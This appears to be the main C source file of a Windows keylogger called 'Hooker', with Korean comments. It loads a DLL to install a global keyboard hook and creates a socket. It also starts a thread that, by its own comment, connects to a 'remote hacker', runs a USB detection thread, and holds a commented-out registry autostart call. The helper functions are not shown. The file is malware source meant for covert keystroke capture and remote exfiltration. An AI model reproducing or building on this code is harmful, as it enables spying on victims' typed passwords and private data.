#include "modules.h"


HINSTANCE g_hInst;
LPCTSTR lpszClass = TEXT("Hooker");
HWND hWndMain;
LPCTSTR FileName = TEXT("C:\\data.txt");
SOCKET hSocket;
SOCKADDR_IN hAddr;
HANDLE hFile;
HANDLE Con_pThread, USB_pThread;
DWORD dwResult;
BOOL isEof = FALSE;

typedef BOOL(*HookProc)();

HINSTANCE KhinstDll;//로드할 인스턴스형태의 dll변수 키보드훅
HINSTANCE MhinstDll;//마우스훅

HookProc Kinstallhook;//키보드
HookProc Kuninstallhook;

HookProc Minstallhook;//마우스
HookProc Muninstallhook;


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할과 같으나 받는 인자가 다르므로 api프로그래밍시에는 WinMain을 사용
	, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	WSADATA wsaData;

	g_hInst = hInstance;
	//윈도우 생성
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW | CS_OWNDC;
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, (HMENU)NULL, hInstance, NULL);

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		MessageBox(hWnd, TEXT("WSAStartUp Failed"), TEXT("Error"), MB_OK);

	//소켓생성
	CreateSocket();
	//원격해커에게 접속시도할 쓰레드 생성 ,USB 디텍터 스레드 실행
	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
	//레지리스트에 자동부팅항목등록
	//Register(); 

	
	while (GetMessage(&Message, NULL, 0, 0)) {
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}

	closesocket(hSocket);
	Kuninstallhook();
	FreeLibrary(KhinstDll);
	TerminateThread(Con_pThread, dwResult);
	TerminateThread(USB_pThread, dwResult);
	CloseHandle(Con_pThread);
	CloseHandle(USB_pThread);
	WSACleanup();
	MessageBox(hWnd, TEXT("종료"), TEXT("알림"), MB_OK);
	return (int)Message.wParam;

}


LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)//실질적인 윈도우의 기능을 구현하는 함수 앞선 peek메시지로부터 메시지를 전달받은 후 처리
{


	switch (iMessage)
	{
	case WM_CREATE:

	    KhinstDll = LoadLibrary(TEXT("DllProject.dll"));

		if (KhinstDll == NULL)
		{
			MessageBox(hWnd, TEXT("dll로드 실패"), TEXT("오류"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}

		Kinstallhook = (HookProc)GetProcAddress(KhinstDll,"StartHook");
		Kuninstallhook = (HookProc)GetProcAddress(KhinstDll,"StopHook");

		if (Kinstallhook == NULL || Kuninstallhook == NULL)
		{

			MessageBox(hWnd, TEXT("함수로딩 실패"), TEXT("오류"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}
		
		Kinstallhook();
		
		return 0;
		

	case WM_DESTROY:

		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, iMessage, wParam, IParam);


}



//키로거 강제종료시 종료코드전달안됨